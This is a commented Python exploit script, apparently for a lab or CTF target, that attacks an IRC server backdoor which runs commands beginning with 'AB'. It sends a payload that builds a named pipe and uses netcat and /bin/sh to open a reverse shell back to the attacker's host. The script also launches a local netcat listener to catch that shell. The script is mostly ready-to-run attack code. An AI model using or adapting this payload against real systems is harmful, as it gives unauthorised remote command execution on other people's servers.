import socket
import sys
import subprocess
import time

# This exploit takes advantage of a backdoor that executes commands that start with the string AB
def exploit(rhost, rport, lhost, lport):
    
    # pipe is used to create a pipe called /tmp/intruder, this will allow for data to be passed between processes
    pipe = 'mkfifo /tmp/intruder; '

    # Creates a connection to our machine and reads input from the /tmp/intruder file
    ncSetup = f'nc {lhost} {lport} 0</tmp/intruder '

    # starts a shell on the targeted mahine and redirect input and output from /bin/sh to /tmp/intruder so that only we see what is being executed
    shellSetup = '| /bin/sh >/tmp/intruder 2>&1; '

    # removes the folder after the payload has been executed
    cleanup = 'rm /tmp/intruder'

    # This is the complete payload
    payload = f'AB; ' + pipe + ncSetup + shellSetup + cleanup

    try:
        # Create a socket object
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Connect the socket to the remote host that we have defined
        sock.connect((rhost, int(rport)))
        print(f"Connected to {rhost}:{rport}")

        # This will send the payload after converting it to bytes
        sock.send(payload.encode('utf-8'))
        print("Payload sent successfully. Check your listener for a shell.")

        # Now we close the connection
        sock.close()

    except Exception as e:
        print(f"[!] An error occurred: {e}")
        sys.exit(1)

# We want to run netcat in another terminal so that we have access to the targeted machine once we exploit it
def ncListener(localPort):

    # This runs netcat to listen for a connection on the port that we specified on our machine
    # nlvp tells netcat to not perform a DNS lookup, to operate in listen mode, to use verbose mode, and to allow for the specification of a specific port
    command = f"nc -nlvp {localPort}"

    # This opens a new terminal and runs the netcat command
    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', command])

if __name__ == '__main__':
    print("Internet Chat Relay Exploit")

    # Prompts user for the remote host, remote ports, local host, and local port
    userInput = input("Usage: <RHOST> <RPORT> <LHOST> <LPORT>\n")

    while len(userInput.split()) != 4:
        print("Incorrect Input")
        userInput = input("Usage: <RHOST> <RPORT> <LHOST> <LPORT>\n")

    # split the input from the command line into the correct vars
    splitInput = userInput.split()

    print("Attempting Exploit")

    rhost = splitInput[0]
    rport = splitInput[1]
    lhost = splitInput[2]
    lport = splitInput[3]

    ncListener(lport)
    time.sleep(2)

    exploit(rhost, rport, lhost, lport)

